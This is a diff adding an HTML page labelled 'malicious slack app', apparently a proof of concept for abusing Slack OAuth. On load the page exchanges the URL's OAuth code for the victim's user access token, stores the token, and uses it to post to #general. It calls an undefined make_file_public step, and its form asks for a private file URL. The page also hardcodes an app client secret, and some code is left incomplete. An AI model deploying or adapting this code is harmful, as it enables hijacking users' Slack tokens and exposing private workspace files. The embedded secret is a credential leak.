@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<title>malicious slack app</title>
+<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<!-- Optional theme -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+</head>
+<body onload="getObject()">
+<div class="container pt-3">
+	<h1>Enter file URL</h1>
+	<input type="text" class="form-control" name="private_file_url" /><br />
+    <button class="btn btn-info">submit</button>
+</div>
+</body>
+<script>
+
+var client_id = "1021671975639.1768669907936";
+var client_secret  = "01853c98bb740723e5a88177fa373c23";
+
+var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
+var data = "code="+code+"&client_id="+client_id+"&client_secret="+client_secret;
+
+
+var post_message = () => {
+	fetch("https://slack.com/api/chat.postMessage?channel=%23general&text=hello&token="+localStorage.getItem("token")).then(
+		resp => resp.json()).then((json) => {
+			console.log(json)
+			setTimeout(make_file_public, 6000);
+		});	
+
+}
+
+function getObject(){
+    		fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
+        		response => response.json()
+    		).then((json) => {
+        		console.log(json);
+        		localStorage.setItem("token", json["authed_user"]["access_token"])
+		});
+
+}
+
+
+</script>
+</html>
